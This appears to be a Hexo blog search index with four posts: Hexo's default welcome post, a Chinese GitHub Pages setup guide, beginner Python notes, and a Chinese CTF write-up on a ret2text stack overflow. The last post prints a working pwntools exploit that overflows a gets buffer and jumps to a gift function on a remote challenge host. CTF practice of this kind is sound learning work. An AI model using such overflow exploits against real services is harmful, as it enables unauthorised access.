<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2024/10/27/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>博客搭建</title>
    <url>/2024/10/27/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<p>一，<strong>搭建前的软件准备</strong>（git，node）<br>搭建之前需要准备的软件：<br>1.Git：官网下载：<a href="https://git-scm.com/">https://git-scm.com/</a><br>2.Node.js 官网下载：<a href="http://nodejs.cn/">http://nodejs.cn/</a></p>
<p>二，** 安装hexo**，完成简单本地页面展示<br>1.进入cmd窗口输入指令：npm install -g hexo-cli</p>
<p>三,接下来<strong>初始化一下hexo</strong></p>
<p>1.输入：<code>hexo init</code></p>
<p>2..查看是否能启动成功:输入：hexo s</p>
<p>3.复制网址打开</p>
<p><a href="http://localhost:4000/">http://localhost:4000/</a><br>(此时博客已经在本地搭建好了)</p>
<p>之后，我们需要部署到github上。</p>
<p>ctrl+C停止；</p>
<p>三，<strong>将Hexo部署到Github</strong><br>1.Github创建个人仓库<br>注册一个github账号。登上账号后建一个仓库：仓库名为你的用户名.github.io，<img src="https://i-blog.csdnimg.cn/blog_migrate/64a3b7752c3c3c6020606d39fe1bf3f9.png" alt="在这里插入图片描述"><br>注意：<br>创建一个和你用户名相同的仓库，后面加.github.io，</p>
<p>xxxx.github.io，其中xxx就是你注册GitHub的用户名.</p>
<p>2.生成ssh添加到Github<br>在Github上创建仓库完成之后，需要设置ssh免密登录</p>
<p>具体操作：打开cmd窗口：执行如下命令：</p>
<p><code>git config --global user.name &quot;yourname&quot;</code><br><code>git config --global user.email &quot;youremail&quot;</code></p>
<p>（这里的yourname输入你的GitHub用户名，youremail输入你GitHub的邮箱。</p>
<p>用户名为仓库的名称，邮箱为注册github的邮箱）</p>
<p>以防万一，用以下代码验证：</p>
<p><code>git config user.name</code><br><code>git config user.email</code></p>
<p>3.接着进入到家目录：C:\Users\libinbin，右击打开git bash 。<br>输入：</p>
<p><code>ssh-keygen -t rsa -C 2412757158@qq.com</code></p>
<p>后面是自己注册github的邮箱，然后敲三次回车，</p>
<p>4.接着就会发现C:\Users\libinbin下多了一个.ssh目录，打开后有一个公钥，一个私钥。id_rsa.pub是公钥，我们需要打开它，复制里面的内容。</p>
<p>然后进入github</p>
<p>点击setings</p>
<p>把刚刚复制的密钥粘进去，title随便起</p>
<p>点击 Add SSH Key</p>
<p>3.进行部署<br>这一步，我们就可以将hexo和GitHub关联起来，也就是将hexo生成的文章部署到GitHub上，打开站点配置文件 _config.yml，翻到最后，修改为</p>
<p><code>deploy:</code></p>
<p><code>type: git</code></p>
<p><code>repo: git@github.com:goubin18/goubin18.github.io.git</code></p>
<p><code>branch: main</code></p>
<p>（注意：后面有空格）</p>
<p>（repo：获取步骤如下<img src="D:\hp\Pictures\PixPin_2024-10-27_23-37-56.png"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/226396db3e5a8db9b1358fb7d7151d3a.png" alt="在这里插入图片描述"></p>
<p>点进自己刚刚创建的仓库）复制</p>
<p>4.找到自己的博客路径打开</p>
<p>这个时候需要先安装deploy-git </p>
<p>npm install hexo-deployer-git –save</p>
<p>5.然后依次执行以下命令：</p>
<p><code>hexo c   #清除缓存文件 db.json 和已生成的静态文件 public</code><br><code>hexo g       #生成网站静态文件到默认设置的 public 文件夹(hexo generate 的缩写)</code><br><code>hexo d       #自动生成网站静态文件，并部署到设定的仓库(hexo deploy 的缩写)</code></p>
<p>注意输出hexo d时会让输个yes</p>
<p>最后回到github上查看自己的仓库：</p>
<p>现在就可以使用xxx.github.io来访问你的博客啦</p>
]]></content>
  </entry>
  <entry>
    <title>Python语言基础</title>
    <url>/2024/11/25/Python%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>1.<strong>打印</strong></p>
<p>print每个print都默认另起一行</p>
<p>print(greet)直接打印greet的值</p>
<p>2.字符串连接””  +</p>
<p>单双引号转义””   ‘’   \</p>
<p>换行\n</p>
<p>三引号跨行字符串’’’ ‘’’</p>
<p>3.<strong>命名</strong></p>
<p>下划线user_age </p>
<p>驼峰UserAge</p>
<p>4.字符串”6”</p>
<p>数字 6</p>
<p>浮点数：6.0</p>
<p>5.<strong>运算的先后顺序</strong>：</p>
<p>（）</p>
<p>**            2**3 ——2的3次方</p>
<p>*&#x2F;</p>
<p>+-</p>
<p>6.<strong>math</strong>提供数学运算函数的库</p>
<p>import math</p>
<p>math.函数名（…）</p>
<p>eg:math.sin(1)</p>
<p>7**.注释**：</p>
<p>整段：CTRL+&#x2F;或者’’’ ‘’’</p>
<p>8.数据类型：int float bool str字符串 NoneType空值类型(表示完全没有值）</p>
<p>str:”hello” ‘哟!’</p>
<p>len(‘hello’)得到字符串的长度</p>
<p>空格，数字，符号都会占据一个长度（转义字符占取一个长度）</p>
<p>“world”[索引] 提取该位置的字符</p>
<p>“world”[3]——&gt;l</p>
<p>bool:真True 假False</p>
<p>print（type（3））输出数据类型int</p>
<p>9.<strong>交互模式</strong></p>
<p>直接输出一行的结果</p>
<p>不用创建文档，不用写print直接输出，命令不会保存。</p>
<p>命令行模式</p>
<p>退出时：键入quit()\n  python3或者CRTL d</p>
<p>10.<strong>input函数</strong></p>
<p>input(里面放字符串）给用户的给用户的提示信息</p>
<p>intput自动返回字符串，所以运用用户输入的信息进行运算时用int，float，等等转换数据类型</p>
<p>对了，str可以把其他类型转换成字符串</p>
<p>因为整数不能和字符串连在一起打印，所以把整形转换成字符型</p>
<p>user_age&#x3D;int(input(“请输入你的年龄：”）</p>
<p>user_user_age_after_10_year&#x3D;user_age+10</p>
<p>print(“您十年后会是”+str（user_user_age_after_10_year)+”岁”）</p>
<p>11.<strong>if语句</strong></p>
<p>age &#x3D; 18</p>
<p> if age &gt;&#x3D; 18:</p>
<p>​    print(“您已成年”)</p>
<p>else:</p>
<p>​    print(“哈哈，你还没成年）</p>
<p>比较运算符：&#x3D;&#x3D;   !&#x3D;   &gt;   &gt;&#x3D;   &lt;   &lt;&#x3D;</p>
<p>记得要加：</p>
<p>执行语句要有缩进（建议是4个空格）</p>
<p>嵌套函数</p>
<p>多个条件判断：elif</p>
<p>if条件：</p>
<p>—-语句</p>
<p>elif条件：</p>
<p>—-语句</p>
<p>elif条件：</p>
<p>—-语句</p>
<p>else：</p>
<p>—-语句</p>
<p>12.<strong>逻辑运算</strong></p>
<p>not &gt;and &gt;or</p>
<p>13.<strong>列表</strong>（类似指针）</p>
<p>其内部可以加不同种类的</p>
<p>shopping_list&#x3D;[“键盘”,”键帽”]</p>
<p>如果要加东西：</p>
<p>shopping_list.append(“显示器”)</p>
<p>删去：</p>
<p>用remov</p>
<p>修改：直接重新定义，覆盖</p>
<p>因为列表可变，所以不要也不应该再给其赋值</p>
<p>利用len函数求长度</p>
<p>列表回返回元素的数量</p>
<p>利用索引定位</p>
<p>max，min，sorted排序好的返回</p>
<p>14.<strong>字典</strong>，可变，</p>
<p>键：值   key：value</p>
<p>键的类型是不可变的（列表不是）</p>
<p>contacts&#x3D;{“小明”：”13700000000”,”小花”:”13700000001”}</p>
<p>contact[‘’小明’’]</p>
<p>①元组，存入相同值，不可变</p>
<p>添加，删除元组不能操作</p>
<p>contacts&#x3D;{(“小明”,23)：”13700000000”,(“小明”,34):”13700000001”}</p>
<p>②字典添加：</p>
<p>contacts[“美女A”]&#x3D;”18600000000”</p>
<p>如果其键已经存在，则重新赋值为覆盖。</p>
<p>要想知道该建是的存在：键 in contacts</p>
<p>print（”小明”in contacts）</p>
<p>存在返回True不存在返回False</p>
<p>③删除一个键值对：</p>
<p>del contacts [“小明”]</p>
<p>④想知道有多少键值对：</p>
<p>len（comtacts）</p>
<p>⑤字典：</p>
<p>字典名.keys所有键</p>
<p>字典名.values所有值</p>
<p>字典名.items所有键值对</p>
<p>15.<strong>for循环</strong></p>
<p>for 变量名 in 迭代对象：</p>
<p>​    if temp&gt;&#x3D;38:</p>
<p>​        print (temp)</p>
<p><strong>整数数列</strong></p>
<p>rang（开始值，结束值，步长）五步长时默认为1</p>
<p>结束值不包含</p>
<p>rang（5，10）</p>
<p>rang（5）</p>
<p>起始值默认为0，</p>
<p>打印1-9的所有奇数</p>
<p>for num in range (1,10,2)</p>
<p>​    print (num)</p>
<p>计算1-100</p>
<p>total&#x3D;0</p>
<p>for i in range (1,101):</p>
<p>​    total&#x3D;total+i</p>
<p>print (total)</p>
<p>16.while循环</p>
<p>while 条件A：</p>
<p>​    行动B</p>
<p>17.格式化字符串</p>
<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251318762.png" alt="image-20241125131838580"></p>
<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251318913.png" alt="image-20241125131856736"></p>
<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251319227.png" alt="image-20241125131910092"></p>
<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251319316.png" alt="image-20241125131932180"></p>
<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251319263.png" alt="image-20241125131948139"></p>
<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251319744.png" alt="image-20241125131955619"></p>
<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251320579.png" alt="image-20241125132014443"></p>
<p>18.<strong>函数</strong>，定义参数</p>
<p>del 函数名 （参数，参数）：</p>
<p>​    #定义函数的代码</p>
<p>​    #…</p>
<p>​    return</p>
<p>调用时：</p>
<p>函数名（实参，实参）</p>
<p>19.<strong>引入模块</strong></p>
<p>因为内置函数有限，因此为了方便计算，可以引入其他标准库</p>
<p>①import模块</p>
<p>模块名.变量名</p>
<p>模块名.函数名</p>
<p>②from 模块名 import 函数或变量</p>
<p>③form 模块名import *</p>
<p>第三方</p>
<p>20.<strong>OOP</strong></p>
<p>面向对象编程</p>
]]></content>
  </entry>
  <entry>
    <title>pwn初体验</title>
    <url>/2024/11/27/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    <content><![CDATA[<p><strong>ret2text</strong></p>
<p>1.先托入ide中查看</p>
<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272027539.png" alt="image-20241127202727338"></p>
<p>2.拖入ida中：</p>
<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272346961.png" alt="image-20241127203614027"></p>
<p>1.分析函数：</p>
<p>确认buf距离栈底20个字节（h为16进制）</p>
<p>gets函数可读入任意长度的数据</p>
<ol start="2">
<li></li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411271931584.png" alt="image-20241127193117448"></p>
<p>因此要将地址改为dt_gift函数的地址</p>
<p>3.写脚本攻击服务器</p>
<p>先在本地运行，（因为本地可以调试）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">p = process(<span class="hljs-string">&quot;./文件名&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>（文件名大小写没关系）</p>
<p>payload:</p>
<p>①距离为 0x20</p>
<p>②地址要加 0x！！！！！</p>
<p>③“junk”占4个字节</p>
<p>3：本题涉及栈平衡因此这个地址不正确</p>
<p>刚开始写的：(有两处错误)</p>
<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272044812.png" alt="image-20241127204433735"></p>
<p>开始写：</p>
<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272054077.png" alt="image-20241127205438921"></p>
<p>接着写payload:</p>
<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411281722375.png" alt="image-20241128172158249"></p>
<p>发现失败了：</p>
<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411281722973.png" alt="image-20241128172235931"></p>
<p>开始调试：</p>
<p>添加：（leave）</p>
<p>gdb.attach是一个函数，会连接当前运行的进程p</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">gdb<span class="hljs-selector-class">.attach</span>(<span class="hljs-selector-tag">p</span>,<span class="hljs-string">&#x27;b*0x00000000004011A2&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411281723933.png" alt="image-20241128172312892"></p>
<p>运行：</p>
<p>这个时候在pwning文件里面打开终端</p>
<p>先输入t（进入分屏）（CTRL＋d退出)</p>
<p><img src="/2024/11/27/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/Users\hp\AppData\Roaming\Typora\typora-user-images\image-20241127213538953.png" alt="image-20241127213538953"></p>
<p>输入c&#x2F;ni（c按了两次）</p>
<p>发现卡住了：</p>
<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272139275.png"></p>
<p>这个时候发现movaps栈不平衡,</p>
<p>回到IDA找到（）</p>
<p>改地址：00000000004011A9</p>
<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272146052.png" alt="image-20241127214607982"></p>
<p>改一下，运行，</p>
<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272150785.png" alt="image-20241127215023656"></p>
<p>发现得到了一个flag,但提交上去显示错误，这个时候再看一看我们写的脚本：发现需要把地址改成远端</p>
<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411281726908.png" alt="image-20241128172659866"></p>
<p>下面的是正确的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;222.22.91.49&quot;</span>,<span class="hljs-string">&quot;32783&quot;</span>)<br><span class="hljs-comment"># gdb.attach(p,&#x27;b*0x00000000004011A2&#x27;)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span> +p64(<span class="hljs-number">0x00000000004011A9</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>之后保存，f5运行</p>
<p>输入ls</p>
<p>输cat flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411281726824.png" alt="image-20241128172635776"></p>
<p>欧克欧克，找到了找到了</p>
]]></content>
  </entry>
</search>
